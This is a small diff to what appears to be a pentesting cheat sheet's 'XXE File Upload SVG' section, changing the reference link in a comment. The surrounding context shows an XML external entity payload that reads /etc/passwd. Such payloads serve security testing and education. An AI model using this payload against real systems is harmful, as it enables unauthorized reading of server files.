@@ -1688,7 +1688,7 @@ SSRF
 #### XXE File Upload SVG
 
 ```powershell
-#https://0xatul.github.io/posts/2020/02/external-xml-entity-via-file-upload-svg/
+#https://scottc130.medium.com/understanding-xxe-vulnerabilities-7e389d3972c2
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
